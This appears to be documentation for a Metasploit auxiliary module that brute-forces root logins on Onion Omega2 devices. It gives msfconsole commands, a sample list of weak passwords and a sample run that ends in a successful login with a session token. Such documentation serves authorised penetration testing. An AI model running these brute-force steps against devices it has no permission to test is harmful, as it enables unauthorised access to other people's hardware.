## Description
The onion_omega2_login module is used to brute-force credentials for Onion Omage2 devices.

## Vulnerable Application
* Onion Omage2 HTTPd Service

![Onion Omega2](https://raw.githubusercontent.com/OnionIoT/Onion-Docs/master/Omega2/Documentation/Get-Started/img/unbox-6-omega-led-detail.jpg)

![Onion Omega2 OnionOS Web Page](https://i.imgur.com/nrHnQaW.png)

## Verification Steps
1. Plug your Onion Omega2 device to a power source. 
    - First time setup can be found [here](https://docs.onion.io/omega2-docs/first-time-setup.html)
2. Connect to its Wi-Fi network.
3. Start `msfconsole`
4. Do: `use auxiliary/scanner/http/onion_omega2_login`
5. Do: `set RHOSTS 192.168.3.1`
6. Do: `set USERPASS_FILE <user pass dictionary>`
    - username and password seperated by space and one pair per line.
7. Do: `run`

Sample userpass file:
```text
root 123456
root password
root 123456789
root 12345678
root 12345
root 10601
root qwerty
root 123123
root 111111
root abc123
root 1234567
root dragon
root 1q2w3e4r
root sunshine
root 654321
root master
```

## Scenario 
```
msf5 > use auxiliary/scanner/http/onion_omega2_login
msf5 auxiliary(scanner/http/onion_omega2_login) > set RHOSTS 192.168.3.1
RHOSTS => 192.168.3.1
msf5 auxiliary(scanner/http/onion_omega2_login) > set USERPASS_FILE something.txt
USERPASS_FILE => something.txt
msf5 auxiliary(scanner/http/onion_omega2_login) > run

[*] Running for 192.168.3.1...
[*] 192.168.3.1:80 - [ 1/16] - root:123456 - Failure
[!] No active DB -- Credential data will not be saved!
[*] 192.168.3.1:80 - [ 2/16] - root:password - Failure
[*] 192.168.3.1:80 - [ 3/16] - root:123456789 - Failure
[*] 192.168.3.1:80 - [ 4/16] - root:12345678 - Failure
[*] 192.168.3.1:80 - [ 5/16] - root:12345 - Failure
[+] Ubus RPC Session: 403e133730879d23a2a0df022e19c19c
[+] 192.168.3.1:80 - [ 6/16] - root:10601 - Success
[*] 192.168.3.1:80 - [ 7/16] - root:qwerty - Failure
[*] 192.168.3.1:80 - [ 8/16] - root:123123 - Failure
[*] 192.168.3.1:80 - [ 9/16] - root:111111 - Failure
[*] 192.168.3.1:80 - [10/16] - root:abc123 - Failure
[*] 192.168.3.1:80 - [11/16] - root:1234567 - Failure
[*] 192.168.3.1:80 - [12/16] - root:dragon - Failure
[*] 192.168.3.1:80 - [13/16] - root:1q2w3e4r - Failure
[*] 192.168.3.1:80 - [14/16] - root:sunshine - Failure
[*] 192.168.3.1:80 - [15/16] - root:654321 - Failure
[*] 192.168.3.1:80 - [16/16] - root:master - Failure
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
